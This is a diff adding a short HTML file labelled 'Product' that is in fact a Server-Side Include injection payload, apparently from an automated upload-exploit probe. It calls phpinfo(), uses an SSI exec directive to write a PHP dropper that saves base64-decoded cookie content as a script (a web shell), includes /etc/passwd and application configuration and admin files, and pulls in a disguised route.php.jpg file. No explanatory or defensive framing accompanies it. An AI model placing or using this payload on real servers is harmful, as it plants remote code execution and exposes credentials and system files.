@@ -1,0 +1,12 @@
+<html>
+	<header>Product</header>
+<body>
+	<?php phpinfo();  ?>
+	Product
+***<!--#exec cmd="echo '<?php file_put_contents(\"route.php\",base64_decode($_COOKIE[\"83067585\"])); echo base64_decode($_COOKIE[\"83067585\"]); ?>' >contact.php; echo 'yxxx''xxxy';" -->***
++++<!--#include file="/etc/passwd" -->+++
+$$$<!--#include file="../config.php" -->$$$
+===<!--#include virtual="../system/startup.php" -->===
+---<!--#include virtual="../admin/index.php" -->---
+</body>wwwwww<!--#include virtual="./route.php.jpg.d57db2750aaa90c4841052101dce865b" -->wwwwwww
+</html>
